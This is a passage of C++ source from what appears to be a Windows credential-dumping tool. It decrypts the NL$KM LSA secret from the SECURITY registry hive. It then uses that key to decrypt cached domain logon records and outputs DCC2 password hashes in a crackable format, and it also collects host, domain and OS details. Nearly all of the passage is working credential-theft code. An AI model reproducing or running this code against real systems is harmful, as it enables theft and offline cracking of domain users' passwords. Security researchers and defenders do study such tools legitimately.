            PrintableLSASecret* ps = ParseSecret(ek, secret);
            if (ps) { secrets.push_back(*ps); delete ps; }
        }
    }
    return true;
}

// ─────────────────────────── NL$KM / DCC2 ────────────────────────────────────
bool GetNLKMSecretKey(HKEY, std::vector<uint8_t>& result) {
    if (!g_NLKMKey.empty()) { result = g_NLKMKey; return true; }
    std::vector<uint8_t> lsaKey;
    if (!GetLSASecretKey(nullptr, lsaKey)) return false;
    HANDLE h = OpenNt("SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal");
    if (!h) return false;
    std::vector<uint8_t> data; ULONG type = 0;
    bool ok = NtQueryValue(h, "", data, type); CloseNt(h);
    if (!ok) return false;
    if (!DecryptLSABlob(data, lsaKey, result)) return false;
    if (result.size() > 32) result.resize(32);
    g_NLKMKey = result; return true;
}

bool GetCachedHashes(HKEY, std::vector<std::string>& result) {
    std::vector<uint8_t> lsaKey;
    if (!GetLSASecretKey(nullptr, lsaKey)) return false;
    HANDLE h = OpenNt("Security\\Cache"); if (!h) return false;
    std::vector<std::string> vnames; NtGetValueNames(h, vnames);
    bool foundIter = false; std::vector<std::string> names;
    for (auto& n : vnames) {
        if (n == "NL$Control") continue;
        if (n == "NL$IterationCount") { foundIter = true; continue; }
        names.push_back(n);
    }
    int iterCount = 10240;
    if (foundIter) {
        std::vector<uint8_t> d; ULONG t = 0;
        if (NtQueryValue(h, "NL$IterationCount", d, t) && d.size() >= 4) {
            uint32_t tmp = ReadLE32(d.data());
            iterCount = (tmp > 10240) ? (int)(tmp & 0xfffffc00) : (int)(tmp * 1024);
        }
    }
    std::vector<uint8_t> nlkmKey;
    if (!GetNLKMSecretKey(nullptr, nlkmKey)) { CloseNt(h); return false; }
    if (nlkmKey.size() < 32) { CloseNt(h); return false; }
    for (auto& name : names) {
        std::vector<uint8_t> data; ULONG t = 0;
        if (!NtQueryValue(h, name, data, t)) continue;
        nl_record hdr; std::vector<uint8_t> enc;
        if (!UnmarshalNLRecord(data.data(), data.size(), hdr, enc)) continue;
        uint8_t nilIV[16] = {}; if (memcmp(hdr.IV, nilIV, 16) == 0) continue;
        if (!(hdr.Flags & 1)) continue;
        std::vector<uint8_t> pt;
        if (!AESCBCDecrypt(nlkmKey.data() + 16, 16, hdr.IV, enc.data(), enc.size(), pt)) continue;
        if (pt.size() < 0x10) continue;
        std::string encHashHex = ToHex(pt.data(), 0x10);
        if (pt.size() < 0x48 + (size_t)hdr.UserLength) continue;
        const uint8_t* rest = pt.data() + 0x48;
        std::string userName = FromUnicodeString(rest, hdr.UserLength);
        size_t skip = (size_t)Pad64(hdr.UserLength) + (size_t)Pad64(hdr.DomainNameLength);
        if (0x48 + skip + (size_t)hdr.DnsDomainNameLength > pt.size()) continue;
        std::string domain = FromUnicodeString(rest + skip, (size_t)Pad64(hdr.DnsDomainNameLength));
        char buf[512];
        sprintf_s(buf, sizeof(buf), "%s/%s:$DCC2$%d#%s#%s",
            domain.c_str(), userName.c_str(), iterCount, userName.c_str(), encHashHex.c_str());
        result.push_back(buf);
    }
    CloseNt(h); return true;
}

// ─────────────────────────── OS version ──────────────────────────────────────
bool GetOSVersionBuild(HKEY, int& build, double& ver, bool& srv) {
    HANDLE h = OpenNt("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, MAXAC);
    if (!h) return false;
    std::string bs, vs; bool ok = QueryStr(h, "CurrentBuild", bs) && QueryStr(h, "CurrentVersion", vs);
    CloseNt(h); if (!ok) return false;
    build = (int)strtol(bs.c_str(), nullptr, 10); ver = strtod(vs.c_str(), nullptr);
    HANDLE h2 = OpenNt("SYSTEM\\CurrentControlSet\\Control\\ProductOptions", 0, MAXAC);
    if (h2) { std::string pt; if (QueryStr(h2, "ProductType", pt))srv = (pt == "ServerNT"); CloseNt(h2); }
    return true;
}

bool GetHostnameAndDomain(HKEY, std::string& hostname, std::string& domain) {
    HANDLE h = OpenNt("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", 0, MAXAC);
    if (!h) return false;
    QueryStr(h, "Domain", domain); QueryStr(h, "Hostname", hostname);
    CloseNt(h); return true;
}

// stubs
HKEY OpenSubKey(HKEY, const char*) { return nullptr; }
HKEY OpenSubKeyExt(HKEY, const char*, DWORD, REGSAM) { return nullptr; }
void CloseKeyHandle(HKEY h) { if (h)RegCloseKey(h); }
bool QueryValueBinary(HKEY, const char*, std::vector<uint8_t>&) { return false; }
bool QueryValueString(HKEY, const char*, std::string&) { return false; }
bool QueryKeyClassName(HKEY, std::string&) { return false; }
bool GetSubKeyNames(HKEY, const char*, DWORD, REGSAM, std::vector<std::string>&) { return false; }
bool GetValueNames(HKEY, std::vector<std::string>&) { return false; }